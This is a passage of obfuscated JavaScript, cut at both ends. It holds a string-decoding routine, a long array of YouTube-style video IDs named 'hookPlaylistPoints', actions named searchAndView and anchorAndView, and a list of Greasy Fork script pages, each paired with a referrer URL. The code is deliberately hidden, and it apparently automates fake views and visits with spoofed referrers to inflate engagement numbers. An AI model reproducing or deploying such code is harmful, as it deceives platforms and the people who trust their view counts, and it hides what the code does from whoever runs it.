        for (let r = 0x1 * 0x2416 + 0x19 * -0x29 + -0x2015, s, t, u = -0x49 * -0x2 + -0x2 * 0x60 + 0x2e; t = n['charAt'](u++); ~t && (s = r % (0x2b1 + -0x215 * 0xd + -0x7 * -0x37c) ? s * (-0x188b + -0x2426 + -0x1 * -0x3cf1) + t : t, r++ % (0xd3 * -0x1 + 0x1223 * 0x1 + 0x6c * -0x29)) ? p += String['fromCharCode'](0x59 * -0x1e + -0x408 + 0xf75 & s >> (-(0xa * 0x12f + 0x1cb8 * 0x1 + 0x81c * -0x5) * r & -0x4 * -0x4c3 + -0x203b + -0x1 * -0xd35)) : 0xa6e + 0x6f * -0x53 + 0x198f) {
          t = o['indexOf'](t);
        }
        for (let v = 0x613 + 0x1a0 * -0xa + 0x1 * 0xa2d, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x5d0 + -0x231a * -0x1 + -0x28da))['slice'](-(-0x2 * -0x5d0 + 0x93 * 0x21 + -0x19 * 0x139));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x2039 + -0x1 * 0x188e + 0x38c7,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x4b3 + 0xf4f + -0x54e * 0x2; u < 0x45f + -0x2298 + 0x1f39; u++) {
          p[u] = u;
        }
        for (u = -0xbce + 0x2b * -0x5c + 0x1b42; u < 0x3 * 0x2f5 + -0x16e7 + 0x4 * 0x3c2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1 * 0x1272 + 0x809 + -0x197b), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x21aa + -0x90d + -0x5 * -0x88b, q = -0x129c + -0x1 * 0x1379 + 0x2615;
        for (let v = 0x453 + 0x22f * -0xd + 0x134 * 0x14; v < n['length']; v++) {
          u = (u + (-0x1a2f + 0xc9 * -0x17 + -0xf1 * -0x2f)) % (0x24 + -0x5f1 + -0x6cd * -0x1), q = (q + p[u]) % (-0x360 + -0x244f * 0x1 + 0x28af), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xec * 0x29 + 0x1 * 0x22db + -0x1 * -0x3f1)]);
        }
        return t;
      };
      b['eqllUq'] = m, c = arguments, b['htNLZP'] = !![];
    }
    const j = e[0x1 * 0xc65 + 0x9 * 0xb1 + -0x129e],
      k = f + j,
      l = c[k];
    return !l ? (b['MpTAFV'] === undefined && (b['MpTAFV'] = !![]), h = b['eqllUq'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    a0(0x23, '[10p') + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    Y(0x4) + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    Z(0x12) + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + Y(0x18) + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + Z(0x14) + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x2) + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x7) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + a0(0x16, '8UWi') + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x2) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
